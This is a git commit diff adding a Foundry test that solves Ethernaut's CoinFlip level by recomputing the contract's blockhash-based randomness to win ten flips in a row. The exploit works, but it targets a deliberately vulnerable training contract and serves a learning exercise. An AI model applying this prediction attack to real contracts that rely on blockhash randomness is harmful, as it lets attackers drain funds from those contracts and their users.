a1ce76e229d0e0bd59ca59f465f3d6a2394728ed
oba <obatirou@gmail.com>
2023-04-13 19:34:54 +0200

    Level 3 CoinFlip: solution

--- src/test/CoinFlip.t.sol
+++ src/test/CoinFlip.t.sol
@@ -28,6 +28,27 @@ contract CoinFlipTest is Test {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+        // It is possible to guess 10 flips in a row by replicating the pseudo random algorithm
+        // In the CoinFlip contract, the value to guess depends on the block.number
+        // It is needed to wait a new block before submitting a new guess
+        // It is emulated thank to vm.roll in foundry
+
+        // 1. Declare variables
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        uint256 blockValue;
+        uint256 coinFlip;
+        bool side;
+        // 2. Loop
+        for (uint256 i; i < 10; i++) {
+            // 2.a Update variable at each loop
+            blockValue = uint256(blockhash(block.number - 1));
+            coinFlip = blockValue / FACTOR;
+            side = coinFlip == 1 ? true : false;
+            // 2.b call the contract with the guess
+            ethernautCoinFlip.flip(side);
+            // 2.c emulate a new block
+            vm.roll(block.number + 1);
+        }
 
         //////////////////////
         // LEVEL SUBMISSION //
